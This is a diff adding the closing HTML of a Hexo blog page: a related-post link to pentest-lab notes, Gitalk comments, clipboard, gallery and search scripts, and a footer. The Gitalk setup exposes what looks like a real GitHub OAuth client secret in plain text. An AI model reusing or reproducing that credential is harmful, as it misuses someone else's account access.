+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">
+								Web靶场-Web For Pentester			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								十二月 17日, 2021				
+							</p>
+							<p class="relate-post-content">
+								[NOTE] Web For Pentester靶场练习笔记前言搞完XVWA之后
+环境hacker: Kali Linux | 192.168.10.1&#x2F;10.10.10.1server: Debian 6 | 192.16...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2021/12/17/Web%E9%9D%B6%E5%9C%BA-Web-For-Pentester/" title="Web靶场-Web For Pentester">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/post-cover/default.jpg" alt="Web靶场-Web For Pentester"/>
+							</a>
+						</div>
+					</li>												
+			
+		</ul>
+	
+</div>	
+				</div>
+				<div class="investment-content-list">
+					<div class="layout-comment">
+
+	
+
+		
+
+			<!-- gitalk comment -->
+			<!-- show gitalk comment -->
+<div id="gitalk-container"></div>
+
+<!-- gitalk`s css & js -->
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<link rel="stylesheet" href="/css/comment.css">
+<script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<script type="text/javascript">
+
+	(function gitalkComment(){
+		//Thanks O-R
+		//https://github.com/gitalk/gitalk/issues/102#issuecomment-382970552
+		//去除尾部匹配正则数组的字符串  
+		//Remove redundant characters
+		String.prototype.trimEnd = function(regStr) {
+			let result = this;
+			if(regStr == undefined || regStr == null || regStr == "") {
+				return result;
+			}
+			let array = regStr.split(',');
+
+			if(array.length > 0) {
+
+				let c = array.shift(), 
+					str = this,
+					i = str.length,
+					rg = new RegExp(c),
+					matchArr = str.match(rg);
+
+				if(matchArr != undefined && matchArr != null && matchArr.length > 0) {
+					let matchStr = matchArr[0].replace(/\\/g, "\\\\").replace(/\*/g, "\\*")
+						.replace(/\+/g, "\\+").replace(/\|/g, "\\|")
+						.replace(/\{/g, "\\{").replace(/\}/g, "\\}")
+						.replace(/\(/g, "\\(").replace(/\)/g, "\\)")
+						.replace(/\^/g, "\\^").replace(/\$/g, "\\$")
+						.replace(/\[/g, "\\[").replace(/\]/g, "\\]")
+						.replace(/\?/g, "\\?").replace(/\,/g, "\\,")
+						.replace(/\./g, "\\.").replace(/\&/g, "\\&");
+					matchStr = matchStr + '$';
+					result = str.replace(new RegExp(matchStr), "");
+				}
+
+				if(array.length > 0) {
+					return result.trimEnd(array.join())
+				} else {
+					return result;
+				}
+			}
+		};
+
+		//Create gitalk
+		let gitalk = new Gitalk({
+			clientID: 'Ov23liAb4iwJ1VAXeknf',
+			clientSecret: 'dbb92e8b0d3419b2a395abc8331a12e38e330e6c',
+			//id: window.location.pathname,
+			//id: decodeURI(window.location.pathname),
+			//id: (window.location.pathname).split("/").pop().substring(0, 49),
+			id: decodeURI( md5( location.href.trimEnd('#.*$,\\?.*$,index.html$') ) ),
+			repo: 'Blog-Gitalk',
+			owner: 'ArcheriShade',
+			admin: 'ArcheriShade',
+			distractionFreeMode: 'true',
+		})
+		gitalk.render('gitalk-container');		
+	})();
+</script>
+
+		
+		
+	
+
+</div>
+				</div>
+				<!-- <div class="investment-content-list">
+					<div class="layout-share">
+	
+	
+		<div class="config-info">
+			Please check the parameter of <b>comment</b> in config.yml of hexo-theme-Annie!
+		</div>	
+	
+</div>
+
+
+				</div> -->
+			</div>	
+		</div>
+	</div>
+</div>
+
+<!-- show math formula -->
+
+
+
+	 
+	
+<script src="/plugin/clipboard/clipboard.js"></script>
+
+	<script>
+		// Copy code !
+	    function preprocessing() {
+	        $("#article-content .highlight").each(function() {
+	            $(this).wrap('<div id="post-code"></div>');
+	        })
+
+	        $("#article-content #post-code").each(function() {
+	            $(this).prepend('<nav class="copy-nav"><span><i class="code-language"></i></span></nav>');
+	        })
+
+	        $("#article-content .copy-nav").each(function() {
+	            let languageClass = $(this).next().attr('class'),
+	                language = ((languageClass.length > 9) && (languageClass != null)) ? languageClass.substr(10) : "none"; //why 9? Need to check language?
+
+	            $(this).find('.code-language').text(language);
+	            $(this).append('<span class="copy-btn icon-paste"></span>');
+	        });
+	    }
+
+		function copy() {
+		    $('#article-content #post-code').each(function(i) {
+		        let codeCopyId = 'codeCopy-' + i;
+
+		        let codeNode = $(this).find('.code'),
+		            copyButton = $(this).find('.copy-btn');
+
+		        codeNode.attr('id', codeCopyId);
+		        copyButton.attr('data-clipboard-target-id', codeCopyId);
+		    })
+   
+			let clipboard = new ClipboardJS('.copy-btn', {
+					target: function(trigger) {
+						return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+					}
+		      	});
+
+			//pure js
+			function showTooltip(elem, msg) {		   
+				elem.setAttribute('aria-label', msg);
+				elem.setAttribute('class', 'copy-btn icon-clipboard1');
+				setTimeout(function() {
+					elem.setAttribute('class', 'copy-btn icon-paste');
+				}, 2000);
+			}
+
+			clipboard.on('success', function(e) {
+			    e.clearSelection();
+			    console.info('Action:', e.action);		   
+			    console.info('Trigger:', e.trigger);
+			    showTooltip(e.trigger, 'Copied!');   
+			});
+			
+			clipboard.on('error', function(e) {
+			    console.error('Action:', e.action);
+			    console.error('Trigger:', e.trigger);
+			});
+		}
+		
+		(function copyCode(){
+			if ($('.layout-post').length) {
+			    preprocessing();
+			    copy();
+			} 
+		})();
+	</script>
+
+
+
+
+
+
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+
+<script src="/plugin/fancybox/jquery.fancybox.js"></script>
+
+
+<script type="text/javascript">
+	(function gallerySet(){
+		let titleID = $('.article-title a'),
+			imageID = $('.article-content img'),
+			videoID = $('.article-content video');
+		
+		let postTitle = titleID.text() ? titleID.text() : "No post title!";
+		
+		imageID.each(function() {
+			let imgPath = $(this).attr('src'),
+				imgTitle = $(this).attr('alt') ? $(this).attr('alt') : "No image description!";
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox="gallery" data-caption="《 ' + postTitle + ' 》' + imgTitle + '"href="' + imgPath + '"> </a>');
+		});
+		
+		videoID.each(function() {
+			let videoPath = $(this).attr('src');
+		
+			//给每个匹配的<img>元素打包, 即添加父元素<a>
+			$(this).wrap('<a data-fancybox href=" ' + videoPath + ' "> </a>');
+		});
+		
+		//TODO：支持html5 video
+
+		if($('#layout-post').length) {
+			$('[data-fancybox="gallery"]').fancybox({
+				loop: true,
+				buttons: [
+					"zoom",
+					"share",
+					"slideShow",
+					"fullScreen",
+					//"download",
+					"thumbs",
+					"close"
+				],
+				protect: true
+			});
+		}
+	})();
+</script>
+		</main>
+
+		<!--footer-->
+		<footer>
+	<div id="navigation-show">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+
+	<div class="copyright">
+		<p>
+			 
+				&copy;2024, content by ArcheriShade. All Rights Reserved.
+			
+			
+				<a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> Theme <a href="https://github.com/Sariay/hexo-theme-Annie" title="Annie" target="_blank" rel="noopener">Annie</a> by Sariay.
+			
+		</p>
+		<p>
+			
+
+	<!-- busuanzi -->
+	<!-- busuanzi -->
+
+
+
+			<a href="javascript:zh_tran('s');" class="zh_click" id="zh_click_s">简体</a> 
+			<a href="javascript:zh_tran('t');" class="zh_click" id="zh_click_t">繁體</a>				
+		</p>
+	</div>		
+</footer>
+		
+	<!-- Local or hitokoto! -->
+
+	
+<script src="/plugin/motto/motto.js"></script>
+
+	
+	<script type="text/javascript">
+		(function motto(){
+			let mottoText = getMingYanContent().split('</br> - </br>'),
+			
+			mottoTextContent = mottoText[0]?mottoText[0]:'请刷新...',
+			
+			mottoTextFrom = mottoText[1]?mottoText[1]:'one/一个';
+			
+			mottoTextContent = mottoTextContent.trim().substring(0, 100);
+		
+			$("#motto-content").html( mottoTextContent);
+			$("#motto-author").html( mottoTextFrom  );
+		})();	
+	</script>	
+
+
+
+<!-- love effect -->
+
+
+<!-- back to top -->
+
+	<div id="totop">
+	<span class="icon-circle-up"></span>
+</div>
+
+
+
+<!-- site analysis -->
+
+
+	<!-- site-analysis -->
+	
+	
+	
+	
+	
+ 
+
+<!-- leancloud -->
+
+
+	<!-- leancloud -->
+	<!--
+	时间：2018-11-27
+	描述：
+		文章访问量：visitors
+		文章喜欢量：likes	
+		文章排行榜：topNPost
+		其他得说明：
+			01-Cookie相关的函数 
+				https://blog.csdn.net/somehow1002/article/details/78511541（Author：somehow1002）
+			02-visitors相关的函数 
+				https://blog.csdn.net/u013553529/article/details/63357382（Author：爱博客大伯）
+				https://notes.doublemine.me/2015-10-21-为NexT主题添加文章阅读量统计功能.html（Author：夏末）
+			03-topNPost相关的函数
+				https://hoxis.github.io/hexo-next-read-rank.html（Author：hoxis）
+			04-likes相关的函数，
+				参考了01 & 02进行简单的设计与实现
+-->
+
+
+	
+
+  
+
+	<!--
+	时间：2018-10-3
+	描述：
+		插件名称：hexo-generator-search-zip
+		插件来源: https://github.com/SuperKieran/hexo-generator-search-zip
+		代码参考：https://github.com/SuperKieran/TKL/blob/master/layout/_partial/search.ejs(Include: js & css)	
+-->
+<div class="popup search-popup local-search-popup scrollbar" >
+	<div class="local-search-container">
+		<span class="popup-btn-close">
+      		ESC
+   		</span>
+		<div class="local-search-header">
+			<div class="input-prompt">				
+			</div>
+			<input autocomplete="off" placeholder="Search..." type="text" id="local-search-input">
+		</div>
+		<div class="local-search-body">
+			<div id="local-search-output"></div>
+		</div>
+		<div class="local-search-footer">
+			<div class="topN-post">				
+				
+								
+			</div>
+		</div>
+	</div>
+</div>
+
+
+<script src="/plugin/search/ziploader.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script type="text/javascript">
+	var search_path = 'search.json',
+		zip_Path = '/search.zip',
+		version_Path = '/searchVersion.txt',
+		input_Trigger = 'auto',
+		top_N = '2';
+
+	themeLocalSearch({
+		search_path, 
+		zip_Path, 
+		version_Path, 
+		input_Trigger, 
+		top_N
+	});
+</script>
+
+
+
+<script src="/plugin/chinese/chinese.js"></script>
+<script src="/plugin/imagelazyloader/yall.min.js"></script>
+<script src="/plugin/imageloaded/imagesloaded.pkgd.min.js"></script>
+<script src="/plugin/nicescroll/jquery.nicescroll.js"></script>
+<script src="/plugin/resizediv/resizediv.js"></script>
+<script src="/js/main.js"></script>
+
+	</body>	
+</html>
